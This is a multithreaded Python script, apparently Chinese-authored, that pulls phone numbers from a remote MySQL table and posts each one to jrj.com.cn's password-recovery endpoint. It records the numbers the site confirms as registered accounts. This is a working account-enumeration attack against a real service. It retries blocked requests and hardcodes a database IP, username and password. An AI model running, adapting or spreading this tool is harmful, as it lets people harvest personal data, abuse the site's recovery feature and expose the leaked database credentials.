# -*- coding: utf-8 -*-

import json, warnings, sys, getopt
import pymysql, requests
from threading import Thread, Lock
from queue import Queue

"""
    2019-05-03
    运行：python3 jrj_mysql_pro.py -h 帮助
                -t 线程数量
                -s 开始页面 -e 结束页面 -p 页面大小
                缺省值请在源码中修改
    功能：读取数据库，重试403请求，保存数据库，多线程
"""

# MYSQL 配置
HOST      = "119.3.55.220"
PORT      = 6789
USER      = "4287e7ae11008807e536c6283f82ea2f"
PASSWORD  = "2tU4yyHkwu"
DATABASE  = "jrj"
TABLE     = "htsec_registered"
COLUMN    = "mobile"

# 页面设置
STARTPAGE = 1000     # 开始页面
ENDPAGE   = 1001     # 结束页面
PAGESIZE  = 10000  # 分页读取行数

# 线程设置
THREAD = 100

# 保存结果表名
SAVE_TABLE = "jrj_registered"


class Jrj(object):
    def __init__(self):

        global read_page
        self.read_page = STARTPAGE
        self.queue = Queue()
        self.lock = Lock()

    def link_mysql(self):
        try:
            self.conn = pymysql.connect(host=HOST, port=PORT, user=USER, password=PASSWORD, database=DATABASE)
            self.cursor = self.conn.cursor()
            # return conn
        except Exception as e:
            print("\n数据库连接失败：%s\n请检查MYSQL配置！\n" % e)

    def check_table(self):
        warnings.filterwarnings("ignore")
        sql = "CREATE TABLE IF NOT EXISTS %s" % SAVE_TABLE + "(id INT (11) AUTO_INCREMENT, phone VARCHAR(11), PRIMARY KEY(id) USING BTREE); "
        self.cursor.execute(sql)

    def save_phone(self, phone):
        try:
            # conn.ping(reconnect=True)
            sql = "INSERT IGNORE INTO %s" % SAVE_TABLE + "(phone) VALUES(%s)" % phone
            self.cursor.execute(sql)
            self.conn.commit()
        except Exception as e:
            print("保存失败：", e)

    def get_phone(self):
        sql = "SELECT %s" % COLUMN + " FROM %s" % TABLE + " LIMIT %s, %s; " % (self.read_page * PAGESIZE, PAGESIZE)
        self.cursor.execute(sql)
        result = self.cursor.fetchall()  # 读取结果

        return result

    def jrj(self):
        while not self.queue.empty():
            mobile = self.queue.get()

            url = "https://sso.jrj.com.cn/sso/entryRetrievePwdMobile"
            form = {'mobile': mobile, 'verifyCode': '1'}

            try:
                r = requests.post(url, data=form, )
                if r.status_code == 200:
                    res = json.loads(r.text)  # 请求结果
                    # print(mobile, res)

                    # 保存有效结果
                    if res['resultCode'] == '4':
                        print(mobile)

                        self.lock.acquire()
                        self.save_phone(phone=mobile)  # 保存数据库
                        self.lock.release()

                else:
                    # print("响应状态码异常：", r.status_code)
                    self.jrj()  # 重试403请求

            except requests.exceptions.RequestException as e:
                print("请求异常：", e)
                return

    def run(self):
        try:
            while self.read_page < ENDPAGE:

                print("\nRead from Mysql: Page %s, PageSize: %s, StartPage: %s, EndPage: %s\n" % (
                    self.read_page, PAGESIZE, STARTPAGE, ENDPAGE))

                # 筛选手机号
                phones = [phone[0] for phone in self.get_phone()]
                          # if phone[0][0] == "1" and phone[0][1] in "35789" and len(phone[0]) == 11]

                # pool.map(jrj, {phone for phone in phones})

                # 手机号入队列
                for phone in phones:
                    self.queue.put(phone)

                # 创建多进程
                for i in range(THREAD):
                    t = Thread(target=self.jrj,)
                    t.start()

                self.read_page = self.read_page + 1  # 页面+1

        except Exception as e:
            # pool.terminate()
            print("\n执行出错：%s，当前结束页面: %s\n" % (e, self.read_page))

        except KeyboardInterrupt:
            # pool.terminate()
            print("\n执行结束，当前结束读取页面: %s\n" % self.read_page)
            exit()


if __name__ == '__main__':

    # 获取参数
    opts, args = getopt.getopt(sys.argv[1:], "hP:s:e:p:", ["P", "s", "e", "p"])
    for opt, arg in opts:

        if opt == "-h":
            print("\n运行：python3 jrj_mysql_pro.py -t 线程数 -s 开始页面 -e 结束页面 -p 页面大小\n"
                  "缺省：-t 100, -s 0, -e 100, -p 10000\n")

        if opt == "-t":
            THREAD = int(arg)

        if opt == "-s":
            STARTPAGE = int(arg)

        if opt == "-e":
            ENDPAGE = int(arg)

        if opt == "-p":
            PAGESIZE = int(arg)

    if len(opts) == 0 or opts[0][0] != "-h":
        j = Jrj()
        j.link_mysql()      # 连接数据库
        j.check_table()     # 检查表
        j.run()          # 运行

        j.conn.close()         # 关闭数据库连接

